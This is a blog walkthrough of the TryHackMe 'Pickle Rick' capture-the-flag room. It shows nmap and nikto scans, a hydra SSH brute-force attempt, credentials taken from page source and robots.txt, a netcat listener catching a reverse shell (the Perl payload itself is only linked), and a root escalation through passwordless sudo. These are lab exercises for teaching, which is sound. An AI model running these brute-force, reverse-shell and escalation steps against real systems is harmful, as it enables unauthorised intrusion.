---
title: "[CTF] Tryhackme - Pickle Rick"
date: 2024-09-08 12:00:00 -500 
categories: [CTF - Tryhackme, Pickle Rick]
tags: [ctf,exploit,flags,tryhackme,pentesting]
author: Christoph K
---
[TryHackMe- Basic Pentesting](https://tryhackme.com/r/room/picklerickt)


# Tasks

    This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

- What is the first ingredient that Rick needs?
- What is the second ingredient in Rick’s potion?
- What is the last and final ingredient?


### What is the first ingredient that Rick needs?

Lets check the website:

```html
  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

Okay it seems that we need to find out the password to get the secret ingredients. At least we found already the `username` in the source code of the page. 

Username: `R1ckRul3s`

Lets check if there some other ports open besides `http`. We do a scan with `nmap`.

```bash
 

└─$ nmap 10.10.240.199 -sC -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-11 13:54 CST                                                                                                                                                                         
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                                                                 
NSE Timing: About 96.49% done; ETC: 13:55 (0:00:00 remaining)                                                                                                                                                                              
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                                                                                                 
NSE Timing: About 96.84% done; ETC: 13:55 (0:00:00 remaining)
Nmap scan report for 10.10.240.199
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 12:a8:af:25:14:c9:31:38:ea:0e:86:c0:19:9c:59:26 (RSA)
|   256 bf:d3:57:4b:38:e8:92:4b:74:cf:0e:a6:45:70:08:4f (ECDSA)
|_  256 e7:76:02:a8:96:09:fe:f4:72:b4:2f:00:d8:30:bc:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Okay, `SSH` is open. Lets try to bruteforce the password via `hydra`.

```bash

hydra -l R1ckRul3s -P rockyou.txt  ssh://10.10.240.199
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-11 13:58:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.240.199:22/
[ERROR] target ssh://10.10.240.199:22/ does not support password authentication (method reply 4).

```
That doesnt work - we get an error in the last line.

Lets change our attack pattern. First we check the `robots.txt` file if it exists.


    ┌──(admin㉿PREDATOR-01)-[/usr/share/wordlists]
    └─$ curl 10.10.240.199/robots.txt
    Wubbalubbadubdub

Okay that could be useful. Looks like a password.


We have a `username`and perhaps a `password`... But no login page. I think we will use a tool called `nikto` to find some vulnerabilities on this page.

https://www.kali.org/tools/nikto/

`nikto` is a powerful open-source web server scanner. It scans for potential vulnerabilites in web server. 

```bash
┌──(admin㉿PREDATOR-01)-[/usr/share/wordlists]
└─$ nikto -h 10.10.240.199                                                                                                                                                                                                                
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.240.199
+ Target Hostname:    10.10.240.199
+ Target Port:        80
+ Start Time:         2024-09-11 14:06:55 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
```

And we found something. We found `/login.php`. And yes, we can now login with the `username` and the potential `password from before. 


That worked. We have a shell here embedded on the webpage. We check the directory with `ls -la`:

![rick01](assets/img/tryhackme/pickle-rick/rick-01.png "rick01")

After trying `cat` we notice, that it does't work. So we have to use the browser for opening the text file.

![rick02](assets/img/tryhackme/pickle-rick/rick-02.png "rick02")



Perfect, we have our first ingredient:

Ingredient 1: `mr. meeseek hair`

### What is the second ingredient in Ricks potion?

Navigating on that online shell is hard. Lets check what we have. With `which` if there is python or perl installed.

`which perl` 


    /usr/bin/perl   


Lets use the first time a reverse shell. We can use that to connect the target system to our device. So we can navigate and get control. I use the reverse shells from `pentestmonkey`.

Perl reverse shell:

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```perl
perl -e 'Check the link to get the reverse shell'

```

While we execute that command in the webpage we have to listen via `netcat` with the flags `-nlvp`
- `-n` no DNS resolutions
- `-l` listen mode
- `-v` verbose mode (more details) 
- `-p` port 


```bash
┌──(admin㉿PREDATOR-01)-[/usr/share/wordlists]
└─$ nc -nlvp 5444                                                                                                                                                                                                                          
listening on [any] 5444 ...
connect to [10.8.24.27] from (UNKNOWN) [10.10.240.199] 53090
/bin/sh: 0: can't access tty; job control turned off
$ cd /home/rick
$ cat second\ ingredients
1 jerry tear
```




And after checking the directories, I found in `/home/rick` the file `second ingredients`


Ingerdient 2: `1 jerry tear`


### What is the last and final ingredient?

We can check what we are allowed to do with our current user with `sudo -l`. It is recommended to try this command in general if you attacked a system.

In our case this command shows us, that we can use all commands with `root` privileges without password!!
```bash
$ sudo -l
Matching Defaults entries for www-data on ip-10-10-240-199:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-240-199:
    (ALL) NOPASSWD: ALL
```

Perfect, lets use `bash -i` to open an interactive shell: 

```bash 
sudo bash -i
bash: cannot set terminal process group (1002): Inappropriate ioctl for device
bash: no job control in this shell
```
As you can see, we are working as `root`now (check the #) 

After browsing a bit in the folders `ubuntu`, `rick` and `root` I found the last ingredient:
```bash
root@ip-10-10-240-199:/# cd /root
root@ip-10-10-240-199:~# cat 3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
```

Last ingredient: `fleeb juice`


## Thoughts:
Funny topic with Rick and well thought CTF. I think it is a very nice use of reverse shell and I think, there are many possiblities to solve this CTF. You dont have to use a reverse shell at all! 
What did we learn? 
- using `nikto` to find vulnerabilities 
- using `reverse shells` in combination with `netcat` 
- navigate into a system while using a `reverse shell`

Hope you liked it. :)